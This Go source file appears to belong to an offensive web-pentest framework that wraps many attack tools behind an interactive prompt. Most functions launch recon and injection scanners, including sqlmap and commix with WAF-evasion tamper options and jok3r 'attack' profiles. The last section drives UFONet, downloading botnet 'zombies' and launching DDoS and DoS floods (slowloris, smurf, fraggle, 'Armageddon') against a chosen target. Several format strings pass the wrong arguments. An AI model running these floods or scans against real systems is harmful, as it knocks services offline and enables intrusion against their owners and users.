package webattackers

import (
    "os"
    "fmt"
    "bufio"
    "strings"
    "menus"
    "utils"
    "banners"
    "bcolors"
    "subprocess"
)

var (
    Input string
    Port  string
    Rhost string
    Xhost string
    Yhost string
    Proxy string
    Module string

    scanner  = bufio.NewScanner(os.Stdin)
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
   "proxy": "",
   "rhost": "",
   "rhosts": "",
   "target": "",
   "module": "",
   "wordlist": WordList,
}

func WebPentest() {
    for {
        fmt.Printf("%s%safr3%s websites(%s%s%s)%s > %s", bcolors.UNDERL, bcolors.BOLD, bcolors.ENDC, bcolors.RED, "bugbounty_pentest.fn", bcolors.ENDC, bcolors.GREEN, bcolors.ENDC)
        scanner.Scan()
        Input = strings.TrimSpace(strings.ToLower(scanner.Text()))
        buildParts := strings.Fields(Input)
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeModule()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

        "? info":           menus.HelpInfo,
        "help info":        menus.HelpInfo,

        "v":                banners.Version,
        "version":          banners.Version,

        "s":                utils.Sleep,
        "sleep":            utils.Sleep,

        "o":                utils.ListJunks,
        "junks":            utils.ListJunks,
        "outputs":          utils.ListJunks,
        "clear junks":      utils.ClearJunks,
        "clear outputs":    utils.ClearJunks,

        "logs":             subprocess.LogHistory,
        "history":          subprocess.LogHistory,
        "clear logs":       subprocess.ClearHistory,
        "clear history":    subprocess.ClearHistory,

        "? run":            menus.HelpInfoRun,
        "h run":            menus.HelpInfoRun,
        "info run":         menus.HelpInfoRun,
        "help run":         menus.HelpInfoRun,
        "? use":            menus.HelpInfoRun,
        "h use":            menus.HelpInfoRun,
        "info use":         menus.HelpInfoRun,
        "help use":         menus.HelpInfoRun,
        "? exec":           menus.HelpInfoRun,
        "h exec":           menus.HelpInfoRun,
        "info exec":        menus.HelpInfoRun,
        "help exec":        menus.HelpInfoRun,
        "? start":          menus.HelpInfoRun,
        "h start":          menus.HelpInfoRun,
        "info start":       menus.HelpInfoRun,
        "help start":       menus.HelpInfoRun,
        "? launch":         menus.HelpInfoRun,
        "h launch":         menus.HelpInfoRun,
        "info launch":      menus.HelpInfoRun,
        "help launch":      menus.HelpInfoRun,
        "? exploit":        menus.HelpInfoRun,
        "h exploit":        menus.HelpInfoRun,
        "info exploit":     menus.HelpInfoRun,
        "help exploit":     menus.HelpInfoRun,
        "? execute":        menus.HelpInfoRun,
        "h execute":        menus.HelpInfoRun,
        "info execute":     menus.HelpInfoRun,
        "help execute":     menus.HelpInfoRun,

        "set":              menus.HelpInfoSet,
        "h set":            menus.HelpInfoSet,
        "info set":         menus.HelpInfoSet,
        "help set":         menus.HelpInfoSet,

        "tips":             menus.HelpInfoTips,
        "h tips":           menus.HelpInfoTips,
        "? tips":           menus.HelpInfoTips,
        "info tips":        menus.HelpInfoTips,
        "help tips":        menus.HelpInfoTips,

        "show":             menus.HelpInfoShow,
        "? show":           menus.HelpInfoShow,
        "h show":           menus.HelpInfoShow,
        "info show":        menus.HelpInfoShow,
        "help show":        menus.HelpInfoShow,

        "info list":        menus.HelpInfoList,
        "help list":        menus.HelpInfoList,
        "use list":         menus.HelpInfoList,
        "list":             menus.HelpInfoList,

        "? options":        menus.HelpInfOptions,
        "info options":     menus.HelpInfOptions,
        "help options":     menus.HelpInfOptions,

        "banner":           banners.RandomBanners,
        "g":                utils.BrowseTutarilas,
        "t":                utils.BrowseTutarilas,
        "guide":            utils.BrowseTutarilas,
        "tutarial":         utils.BrowseTutarilas,
        "h":                menus.HelpInfoMenuZero,
        "?":                menus.HelpInfoMenuZero,
        "00":               menus.HelpInfoMenuZero,
        "help":             menus.HelpInfoMenuZero,
        "f":                menus.HelpInfoFeatures,
        "use f":            menus.HelpInfoFeatures,
        "features":         menus.HelpInfoFeatures,
        "use features":     menus.HelpInfoFeatures,

        //Chameleons//
        "info":             menus.HelpInfoMain,

        "m":                menus.MenuEight,
        "menu":             menus.MenuEight,

        "option":           menus.HelpInfOptions,
        "options":          menus.HelpInfOptions,
        "show option":      menus.HelpInfOptions,
        "show options":     menus.HelpInfOptions,

        "modules":          menus.ListMainModules,
        "show all":         menus.ListMainModules,
        "list all":         menus.ListMainModules,
        "list modules":     menus.ListMainModules,
        "show modules":     menus.ListMainModules,
    }
    if action, exists := commandMap[cmd]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{
       "proxy": &Proxy,
       "rhost": &Rhost,
       "rhosts": &Rhost,
       "target": &Rhost,
       "module": &Module,
       "wordlist": &WordList,
    }
    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{
       "proxy": &Proxy,
       "rhost": &Rhost,
       "rhosts": &Rhost,
       "target": &Rhost,
       "module": &Module,
       "wordlist": &WordList,
    }
    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
    } else {
        menus.HelpInfoSet()
    }
}


func executeModule() {
    if Module == ""{
        fmt.Printf("\n%s[!] %sMissing required parameter MODULE. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.RED, bcolors.ENDC, bcolors.DARKGREEN, bcolors.ENDC)
        return
    }
    WebPenModules(Module, Rhost)
}

func formatRhost(Rhost string) {
    prefixes := []string{"http://", "https://", "www."}
    Yhost = Rhost
    for _, prefix := range prefixes {
        Yhost = strings.TrimPrefix(Yhost, prefix)
    }
    Yhost = strings.TrimSpace(Yhost)
    if !strings.HasPrefix(Rhost, "http://") && !strings.HasPrefix(Rhost, "https://") {
        Xhost = "http://" + Rhost
    } else {
        Xhost = Rhost
    }
}

func WebPenModules(module string, args ...interface{}) {
    fmt.Printf("\nRHOST => %s\nMODULE => %s\n", Rhost, module)
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        utils.SetProxy(Proxy)
    }

    commands := map[string]func() {
        "enumscan": func() {Sublist3r(Rhost)},
        "dnsrecon": func() {DnsRecon(Rhost)},
        "portscan": func() {PortScan(Rhost)},
        "techscan": func() {TechScan(Rhost)},
        "fuzzscan": func() {FuzzScan(Rhost)},
        "leakscan": func() {LeakScan(Rhost)},
        "vulnscan": func() {VulnScan(Rhost)},
       "assetscan": func() {AssetScan(Rhost)},
        "autoscan": func() {AutoScan(Rhost)},
    }

    if action, exists := commands[module]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sInvalid module %s. Use %s'help' %sfor available modules.\n", bcolors.YELLOW, bcolors.ENDC, module, bcolors.DARKGREEN, bcolors.ENDC)
    }
}



func EnumScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming enumscan scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("subfinder -all -d %s; amass enum -d %s; findomain -t %s; chaos-client -d %s; shuffledns -d %s; alterx -l %s", Rhost, Rhost, Rhost, Rhost, Rhost, Rhost)
}

func DnsRecon(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming dnsrecon scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("dnsx -l %s; asnmap -d %s; cdncheck -l %s", Rhost, Rhost, Rhost)
}

func PortScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming full port scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("naabu -nmap-cli 'nmap -v -sV -sC' -host %s", Rhost)
}

func TechScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming tech detection scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`httpx -l %s; aquatone -out %s; httprobe -l %s; gowitness -l %s`, Rhost, Rhost, Rhost, Rhost)
}

func FuzzScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming fuzz scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt")
}

func LeakScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming leak scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("gitleaks detect -v; trufflehog filesystem --no-update --json; semgrep -l")
}

func AssetScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming asset scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("waybackurls %s; gau %s; urlfinder -l %s; gospider -s %s")
}

func VulnScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...\n", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen("nuclei -l %s; jaeles -l %s; ffuf -u %s; uncover -l %s; cvemap -l %s; dalfox -b -u %s; qsreplace -l %s")
}

func AutoScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming auto scan ...\n", bcolors.GREEN, bcolors.ENDC)
}

func Sublist3r(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/sublist3r/; python3 sublist3r.py -v -d %s`, ToolsDir, Rhost)
}

func Ashock1(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ashok/; python3 ashok.py --headers %s`, ToolsDir, Rhost)
}

func OneForAll(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/oneforall/; python3 oneforall.py --alive True --brute True --port medium --dns True --req True --takeover True --show True run --target %s `, ToolsDir, Rhost)
}

func SeekOlver(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/seekolver/; python3 seekolver.py -v -r -k -cn -p 80 443 -te %s`, ToolsDir, Rhost)
}

func ParamSpider(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming urls mine ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/paramspider/; python3 paramspider.py -s -d %s`, ToolsDir, Rhost)
}

func SslScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming ssl scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`sslscan --show-certificate --show-sigs --tlsall --verbose %s`, ToolsDir, Rhost)
}

func Gobuster(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming dir recon ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`gobuster dir vhost --debug --no-error --random-agent -w %s/WordList/everything.txt -e -u %s`, ToolsDir, Rhost)
}

func Nuclei(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`nuclei -u %s`, ToolsDir, Rhost)
}

func Nikto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`nikto -ask no -Cgidirs all -Display 3 -host %s`, ToolsDir, Rhost)
}

func Bbot(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 3rd vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m gowitness nuclei --allow-deadly -t %s`, ToolsDir, Rhost)
}

func Uniscan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 4th vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`uniscan -qweds -u %s`, ToolsDir, Rhost)
}

func SqlmapAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming sql scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s`, ToolsDir, Rhost)
}

func SqlmapMan() {
    fmt.Printf("\n%s[*] %sPerforming man sql scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard`)
}

func CommixAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming command scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 -u %s`, ToolsDir, Rhost)
}

func CommixMan() {
    fmt.Printf("\n%s[*] %sPerforming man command scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 --wizard`)
}

func KatanaAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming xss scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`katana -jc -kf all -c 5 -d 3 %s | httpx -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav`, ToolsDir, Rhost)
}

func XsserAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd xss scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`xsser -c 100 --Cl -u %s`, ToolsDir, Rhost)
}

func XsserMan() {
    fmt.Printf("\n%s[*] %sPerforming man xss scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`xsser -u --wizard`)
}

func NetTacker1(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -m port_scan -t 100 -i %s`, ToolsDir, Rhost)
}

func NetTacker2(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming domain scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m subdomain_scan`, ToolsDir, Rhost)
}

func NetTacker3(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming admin finder scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m scan`, ToolsDir, Rhost)
}

func NetTacker4(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming info gathering ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m information_gathering -s`, ToolsDir, Rhost)
    fmt.Println()
}

func NetTacker5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m server_version_vuln`, ToolsDir, Rhost)
}

func NetTacker6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming CVE scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m cve`, ToolsDir, Rhost)
}

func NetTacker7(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m high_severity`, ToolsDir, Rhost)
}

func NetTacker8(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming intrusive scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s --profile all/results.txt`, ToolsDir, Rhost)
}

func NetTacker9() {
    fmt.Printf("\n%s[*] %sLaunched WebUI key: africana ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py --start-api --api-access-key africana`, ToolsDir, Rhost)
}

func Jok3r1() {
    fmt.Printf("\n%s[*] %sInstalling tools in the toolbox ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; bash install-all.sh`, ToolsDir, Rhost)
}

func Jok3r2() {
    fmt.Printf("\n%s[*] %sUpdating tools in the toolbox ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py toolbox --update-all --auto`, ToolsDir, Rhost)
}

func Jok3r3() {
    fmt.Printf("\n%s[*] %sShowing tools in the toolbox ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py toolbox --show-all`, ToolsDir, Rhost)
}

func Jok3r4() {
    fmt.Printf("\n%s[*] %sShowing supported products ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py info --services`, ToolsDir, Rhost)
}

func Jok3r5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming avery fast-scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast`, ToolsDir, Rhost)
}

func Jok3r6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming security checks on " + bcolors.RED + "\nTarget: " + bcolors.YELLOW + "%s \n" + bcolors.ENDC, Rhost)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, ToolsDir, Rhost)
}

func Jok3r7(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, ToolsDir, Rhost)
}

func Jok3r8() {
    fmt.Printf("\n%s[*] %sShowing results & scans ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -`)
}

func Jok3r9() {
    fmt.Printf("\n%s[*] %sCleaning results & scans ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py db "mission -d default"`)
}

func Osmedeus1() {
    fmt.Printf("\n%s[*] %sUpdating Osmedeus & Runing diagnostics to checks ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean`)
}

func Osmedeus2(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming simple scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus --nv scan -t %s`, ToolsDir, Rhost)
}

func Osmedeus3(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming dir & vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus --nv scan -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus4(Targe string) {
    fmt.Printf("\n%s[*] %sPerforming bulk scan on " + bcolors.ORANGE + "Targets " + bcolors.ENDC + "= " + bcolors.GREEN + bcolors.ITALIC + "%s \n" + bcolors.ENDC, Rhost)
    subprocess.Popen(`osmedeus scan -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming cloud scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s`, ToolsDir, Rhost)
}

func Osmedeus6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming secret & vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus7(Rhost string) {
    fmt.Printf("\n%s[*] %sUpdating db before running vuln scan ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus scan --update-vuln -t %s`, ToolsDir, Rhost)
}

func Osmedeus8(Port string) {
    fmt.Printf("\n%s[*] %sStarted Osmedeusweb UI server on " + bcolors.ORANGE + "localhost:%s%s", Port, bcolors.ENDC)
    subprocess.Popen(`osmedeus server --port %s`, Port)
}

func Osmedeus9() {
    fmt.Printf("\n%s[*] %sShowing scanned osmedeus report list ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`osmedeus report list`)
}

func Ufonet1() {
    fmt.Printf("\n%s[*] %sDownloading list of bots from C.S ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --download-zombies`)
}

func Ufonet2() {
    fmt.Printf("\n%s[*] %sTesting If all bots are alive & ready to launch ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -t botnet/zombies.txt`)
}

func Ufonet3(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Palantir 3.14 ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet4(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Socking_waves(instant-knockout!) ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet5(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched xcom-1(only DDoS) ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet6(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched xcom-2(only DoS) ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet7() {
    fmt.Printf("\n%s[*] %sLaunched ufonet UI on http://localhost:9999 ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --gui`)
}

func Ufonet8() {
    fmt.Printf("\n%s[*] %sStarted Grider ufonet --grider ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --grider`)
}

func Ufonet9(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Armageddon! with All! ...", bcolors.GREEN, bcolors.ENDC)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, ToolsDir, Rhost)
}

